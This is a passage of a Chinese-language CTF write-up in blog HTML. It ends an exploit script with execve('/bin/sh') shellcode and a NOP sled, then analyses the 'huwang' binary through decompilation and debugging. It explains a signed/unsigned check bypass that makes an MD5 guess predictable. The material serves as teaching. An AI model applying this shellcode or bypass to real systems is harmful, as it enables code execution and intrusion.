class="string">            mov rdi,rsi</span></span><br><span class="line"><span class="string">            add rdi,0xb4d</span></span><br><span class="line"><span class="string">            xor rdx,rdx</span></span><br><span class="line"><span class="string">            xor rsi,rsi</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            '''</span>) <span class="comment"># b83b0000004889f74881c74d0b00004831d24831f60f05</span></span><br><span class="line">shell += <span class="string">"/bin/sh\0"</span> <span class="comment"># 2f62696e2f736800</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the other method of shell</span></span><br><span class="line"><span class="comment"># shell = asm(shellcraft.sh())</span></span><br><span class="line">payload2 = <span class="string">'\x90'</span>*(<span class="number">0x1000</span><span class="number">-0x500</span>+<span class="number">0x30</span>+<span class="number">0x06</span>) + shell</span><br><span class="line"></span><br><span class="line">Io.sendline(payload2)</span><br><span class="line">Io.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="0x04-总结-1"><a href="#0x04-总结-1" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>这道题主要考的是Linux系统下，怎么利用汇编来进行系统调用。以及使用mmap()函数，分配内存块时的策略。</p>
<h3 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h3><h4 id="0x00-file-amp-amp-checksec-2"><a href="#0x00-file-amp-amp-checksec-2" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file huwang </span><br><span class="line">huwang: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f74d9c8c7f896833ec74d4a898784772c139878a, stripped</span><br><span class="line">$ checksec huwang</span><br><span class="line">[*] <span class="string">'/home/.../Desktop/huwang/huwang'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>可以看到这是一个64bit的ELF程序，并且stripped掉了符号表。保护措施，除了PIE没有开启，也就是地址不会随机化，其他都开启了。</p>
<h4 id="0x01-观察程序行为-1"><a href="#0x01-观察程序行为-1" class="headerlink" title="0x01 观察程序行为"></a>0x01 观察程序行为</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ ./huwang </span><br><span class="line"> _   _     __        __                ____       _ </span><br><span class="line">| | | |_   \ \      / /_ _ _ __   __ _| __ )  ___(_)</span><br><span class="line">| |_| | | | \ \ /\ / / _` | <span class="string">'_ \ / _` |  _ \ / _ \ |</span></span><br><span class="line"><span class="string">|  _  | |_| |\ V  V / (_| | | | | (_| | |_) |  __/ |</span></span><br><span class="line"><span class="string">|_| |_|\__,_| \_/\_/ \__,_|_| |_|\__, |____/ \___|_|</span></span><br><span class="line"><span class="string">                                 |___/              </span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">Sorry, an unknown error has occurred!</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">size:5</span></span><br><span class="line"><span class="string">content:12345</span></span><br><span class="line"><span class="string">Success~</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">invalid choice</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">Sorry, an unknown error has occurred!</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">index:1</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">4</span></span><br></pre></td></tr></table></figure>
<p>可以看到，不管有没有Note,选Show Note，都显示Sorry, an unknown error has occurred!其它没什么特别的。下面我们用IDA打开来看看。</p>
<h4 id="0x02-IDA分析-2"><a href="#0x02-IDA分析-2" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  set_timer();</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = get_option_num();                    <span class="comment">// 获取选项</span></span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show_note();                              <span class="comment">// 3.显示Note</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )                            <span class="comment">// 4.退出</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">        option_666();                           <span class="comment">// 选项666</span></span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);                   <span class="comment">// 无效的选择</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_note();                               <span class="comment">// 1.添加Note</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      delete_note();                            <span class="comment">// 2.删除Note</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到，有一个选项666，并没有在菜单中出现，我们进去看一下。后面我们可以知道，除了这个666选项有用，其他选项是没用的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">option_666</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST04_4</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> fda; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> encrypt_nums; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> name; <span class="comment">// [rsp+60h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);                   <span class="comment">// canary</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input your name"</span>);               <span class="comment">// 输入不超过0x20字节的名字</span></span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x20</span>uLL);                      <span class="comment">// 这里超过0x19字节会覆盖canary</span></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to guess the secret?"</span>);</span><br><span class="line">  get_choose(&amp;result, <span class="number">2L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="string">'y'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( access(<span class="string">"/tmp/secret"</span>, <span class="number">0</span>) == <span class="number">-1</span> )       <span class="comment">// 如果/tmp/secret不存在</span></span><br><span class="line">    &#123;</span><br><span class="line">      HIDWORD(v1) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x41</span>, <span class="number">0777L</span>L);<span class="comment">// 创建/tmp/secret文件，flags:O_CREAT(0x40)|O_WRONLY(0x01),赋予777权限</span></span><br><span class="line">      fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);             <span class="comment">// flags:O_RDONLY(0x00)</span></span><br><span class="line">      read(fd, s, <span class="number">12u</span>LL);                       <span class="comment">// 从/dev/urandom读取12字节随机数</span></span><br><span class="line">      LODWORD(v1) = <span class="number">0</span>;                          <span class="comment">// /tmp/secret文件描述符值的低32位赋0</span></span><br><span class="line">      <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">11</span> )            <span class="comment">// 有符号v1与0xB，比较，小于0xB</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v1] &amp;= <span class="number">1u</span>;                <span class="comment">// 使读出的随机数每个字节的高7位为0</span></span><br><span class="line">        LODWORD(v1) = v1 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      write(SHIDWORD(v1), s, <span class="number">12u</span>LL);            <span class="comment">// 将读出的随机数经过处理写入/tmp/secret</span></span><br><span class="line">      close(SHIDWORD(v1));</span><br><span class="line">      close(fd);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = open(<span class="string">"/tmp/secret"</span>, <span class="number">0</span>, v1);            <span class="comment">// flags:O_RDONLY(0x00)</span></span><br><span class="line">    read(v0, s, <span class="number">12u</span>LL);</span><br><span class="line">    close(v0);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input how many rounds do you want to encrypt the secret:"</span>);</span><br><span class="line">    encrypt_nums = get_option_num();            <span class="comment">// 输入对secret加密的次数</span></span><br><span class="line">    <span class="comment">// 只判断了大于 10 和为0 的情况</span></span><br><span class="line">    <span class="keyword">if</span> ( encrypt_nums &gt; <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"What? Why do you need to encrypt so many times?"</span>);<span class="comment">// 超过10次，退出</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !encrypt_nums )                        <span class="comment">// 加密次数为0，退出</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"At least encrypt one time"</span>, s);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    HIDWORD(v2) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x201</span>);   <span class="comment">// flags:O_TRUNC(0x200)|O_WRONLY(0x01)</span></span><br><span class="line">    LODWORD(v2) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2 &lt; encrypt_nums )   <span class="comment">// 当加密次数输入为-1时，v2(无符号)与encrypt_num(有符号)比较时，-1会变成一个很大的数，致使程序一直处于加密循环中</span></span><br><span class="line">    &#123;</span><br><span class="line">      MD5((__int64)s, <span class="number">16L</span>L, (__int64)s);</span><br><span class="line">      LODWORD(v2) = v2 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    write(SHIDWORD(v2), s, <span class="number">16u</span>LL);</span><br><span class="line">    close(SHIDWORD(v2));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try to guess the md5 of the secret"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;s1, <span class="number">16u</span>LL);                        <span class="comment">// 输入你猜测的secret的MD5值</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;s1, s, <span class="number">16u</span>LL) )               <span class="comment">// 进行比较，相等则进入</span></span><br><span class="line">      cmp_md5_true((__int64)&amp;name);</span><br><span class="line">    <span class="comment">// 不相等，进行下列操作</span></span><br><span class="line">    v4 = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x201</span>, <span class="number">0777L</span>L, v2);<span class="comment">// flags:O_TRUNC(0x200)|O_WRONLY(0x01)</span></span><br><span class="line">    fda = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);              <span class="comment">// flags:O_RDONLY(0x00)</span></span><br><span class="line">    read(fda, s, <span class="number">12u</span>LL);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">      s[i] &amp;= <span class="number">1u</span>;</span><br><span class="line">    write(v4, s, <span class="number">12u</span>LL);</span><br><span class="line">    close(v4);</span><br><span class="line">    close(fda);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Oh!bye %s\n"</span>, &amp;name);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们需要了解open()函数的flags的几个相关参数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">头文件：</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">函数原型：</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br><span class="line"></span><br><span class="line">函数参数：</span><br><span class="line">*pathname：要打开的文件的路径及名称</span><br><span class="line">flags:位掩码，用于指定文件的访问模式</span><br><span class="line">mode:当调用open()创建新文件时，指定了文件的访问权限，若flags未包含O_CREAT标志，则可以省略mode参数</span><br><span class="line"></span><br><span class="line">flags:</span><br><span class="line">文件访问标志：O_RDONLY、O_WRONLY、O_RDWR,这三者不能同时使用，只能指定其中一种</span><br><span class="line">             O_RDONLY:以只读权限打开</span><br><span class="line">             O_WRONLY:以只写权限打开</span><br><span class="line">             O_RDWR:以读写权限打开</span><br><span class="line">文件创建标志：这里面只说此题中用到的O_TRUNC。</span><br><span class="line">             O_TRUNC:如果文件已经存在且为普通文件，那么将文件内容清空，将其长度置<span class="number">0.</span></span><br><span class="line">已打开文件状态标志</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里由于IDA显示的是多个flags选项相或的值，我们可以通过constgrep命令查看每个flags选项的的值，并进行计算，确定所用的flags选项。</p>
<p>&emsp;&emsp;程序首先通过open()创建只写文件/tmp/secret，并赋予777权限。然后从/dev/urandom读出12个字节随机数，处理后存入/tmp/secret文件，并关闭文件。然后在执行MD5加密前，以flags:O_TRUNC(0x200)|O_WRONLY(0x01)调用open()函数，将/tmp/secret文件清空，对处理后的随机数执行MD5加密后，将MD5加密后的结果存入/tmp/secret文件。然后让我们猜加密后的MD5值，猜对了进入存在明显溢出漏洞的cmp_md5_true函数。</p>
<p>&emsp;&emsp;我们这里需要绕过MD5值对比的验证，进入漏洞函数进行利用。对随机数进行MD5加密的次数，是由用户控制的，由于程序只判断了加密次数大于10和等于0的情况，所以这里可以通过输入-1进行绕过。当我们输入-1时，在进行加密次数判断时，v2(无符号)与encrypt_num(有符号)比较时，-1会变成一个很大的数，致使程序一直处于加密循环中，造成程序运行超时退出，时间为一分钟。导致/tmp/secret文件为空，这是我们再开一个交互，就可以预测MD5的值了，由于文件为空，所以被加密的明文为”\x00”*16,我们通过hashlib算出”\x00”*16的MD5值，即可绕过验证。</p>
<p>下面是一些调试过程:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、创建完/tmp/secret后，文件描述符值</span><br><span class="line">   <span class="number">0x4011dc</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x4011e1</span>    <span class="keyword">call</span>   <span class="number">0x400b40</span>	HIDWORD(v1) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x41</span>, 0777LL)<span class="comment">;</span></span><br><span class="line"> </span><br><span class="line"> ► <span class="number">0x4011e6</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x7c</span>], <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x4011e9</span>    <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x4011ee</span>    <span class="keyword">mov</span>    <span class="built_in">edi</span>, <span class="number">0x4019cd</span></span><br><span class="line">*<span class="built_in">RAX</span>  <span class="number">0x3</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、看看程序对从/dev/unrandom读出的随机数做了什么</span><br><span class="line">   <span class="number">0x401216</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x80</span>], <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x40121d</span>    <span class="keyword">jmp</span>    <span class="number">0x40123b</span></span><br><span class="line">pwndbg&gt; <span class="built_in">dq</span> <span class="built_in">rbp</span>-<span class="number">0x80</span></span><br><span class="line">00007fffffffdc80     <span class="number">0000000300000000</span> 00007fff00000004</span><br><span class="line">00007fffffffdc90     <span class="number">0000000000000079</span> <span class="number">0000000000000000</span></span><br><span class="line">00007fffffffdca0     b563b8cc0cfde998 00000000f9684b16</span><br><span class="line">00007fffffffdcb0     00007fffffffddf0 <span class="number">0000000000000000</span></span><br><span class="line"></span><br><span class="line">while ( v1 &lt;= <span class="number">11</span> )                        // 有符号v1与<span class="number">0xB</span>，比较，小于<span class="number">0xB</span>则执行while循环，处理随机数</span><br><span class="line">&#123;</span><br><span class="line">  s[v1] &amp;= 1u<span class="comment">;</span></span><br><span class="line">  LODWORD(v1) = v1 + <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">执行上一段代码前：s[<span class="number">32</span>]</span><br><span class="line">pwndbg&gt; <span class="built_in">db</span> <span class="built_in">rbp</span>-<span class="number">0x60</span></span><br><span class="line">00007fffffffdca0     <span class="number">98</span> e9 fd 0c cc b8 <span class="number">63</span> b5 <span class="number">16</span> 4b <span class="number">68</span> f9 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">00007fffffffdcb0     f0 <span class="built_in">dd</span> ff ff ff 7f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">执行上一段代码后：s[<span class="number">32</span>]</span><br><span class="line">pwndbg&gt; <span class="built_in">db</span> <span class="built_in">rbp</span>-<span class="number">0x60</span></span><br><span class="line">00007fffffffdca0     <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span>| <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">00007fffffffdcb0     f0 <span class="built_in">dd</span> ff ff ff 7f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">这段代码使读出的随机数每个字节的高<span 